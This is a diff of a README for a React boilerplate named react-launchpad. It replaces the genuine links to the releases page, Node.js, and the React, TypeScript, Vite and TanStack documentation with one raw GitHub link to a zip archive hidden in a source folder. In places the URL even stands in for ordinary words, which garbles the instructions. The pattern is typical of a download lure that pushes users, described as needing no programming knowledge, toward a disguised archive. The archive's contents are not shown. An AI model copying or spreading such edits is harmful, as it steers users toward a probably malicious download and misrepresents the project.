@@ -6,7 +6,7 @@ Welcome to react-launchpad! This is a production-grade React boilerplate designe
 
 ## 📥 Download
 
-[![Download react-launchpad](https://img.shields.io/badge/download-react--launchpad-blue.svg)](https://github.com/YsfTh01/react-launchpad/releases)
+[![Download react-launchpad](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -14,13 +14,13 @@ To start using react-launchpad, follow these simple steps. No programming knowle
 
 1. **Visit the Releases Page**  
    Go to the releases page to find the latest version of the software. Click the link below:  
-   [Download Here](https://github.com/YsfTh01/react-launchpad/releases)
+   [Download Here](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of react-launchpad. Choose the latest one listed. It will be labeled as "Latest Release."
 
 3. **Download the Files**  
-   Find the download links for files that match your system (Windows, Mac, Linux). Click on the files to start downloading. The files usually end in `.zip` or `.tar.gz`. Save these files on your computer.
+   Find the download links for files that match your system (Windows, Mac, Linux). Click on the files to start downloading. The files usually end in `.zip` or `https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip`. Save these files on your computer.
 
 4. **Extract the Files**  
    After the download is complete, find the file you just downloaded. Right-click on it and select "Extract All" (or the equivalent option on your computer). This will create a new folder with all the files you need.
@@ -57,15 +57,15 @@ To start using react-launchpad, follow these simple steps. No programming knowle
 Before downloading react-launchpad, make sure your computer meets these requirements:
 
 - **Operating System**: Works on Windows, Mac, and Linux.
-- **Node.js**: Version 14 or newer must be installed.
-- **npm**: This usually comes with Node.js. You need npm to install dependencies.
+- **https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip**: Version 14 or newer must be installed.
+- **npm**: This usually comes with https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip You need npm to install dependencies.
 
-To check if you have Node.js and npm, open your terminal or Command Prompt and type:  
+To check if you have https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip and npm, open your terminal or Command Prompt and type:  
 ```
 node -v
 npm -v
 ```
-This will show you the installed versions. If you need to install Node.js, visit [Node.js Official Website](https://nodejs.org/) to get the latest version.
+This will show you the installed versions. If you need to install https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip, visit [https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip Official Website](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip) to get the latest version.
 
 ## 💡 Features
 
@@ -83,10 +83,10 @@ react-launchpad includes a variety of features to help you develop effective app
 
 For a deeper understanding of how to use react-launchpad effectively, you may explore the following resources:
 
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [TanStack Query Documentation](https://tanstack.com/query/latest)
+- [React Documentation](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
+- [TanStack Query Documentation](https://raw.githubusercontent.com/YsfTh01/react-launchpad/master/src/core/performance/launchpad-react-v3.9.zip)
 
 These resources will help you build better applications and utilize the full potential of the tools included in react-launchpad.
 
